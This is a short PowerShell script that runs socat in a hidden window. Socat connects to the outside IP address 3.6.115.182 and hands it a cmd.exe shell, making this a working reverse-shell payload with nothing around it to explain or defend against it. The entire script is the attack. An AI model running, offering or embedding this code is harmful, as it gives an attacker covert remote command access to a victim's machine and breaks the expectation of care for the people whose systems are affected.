$command = ".\socat.exe tcp-connect:3.6.115.182:15927 exec:""cmd.exe"",pipes"
$processInfo = New-Object System.Diagnostics.ProcessStartInfo
$processInfo.FileName = "powershell.exe"
$processInfo.Arguments = "-WindowStyle Hidden -Command $command"
$process = New-Object System.Diagnostics.Process
$process.StartInfo = $processInfo
$process.Start() | Out-Null
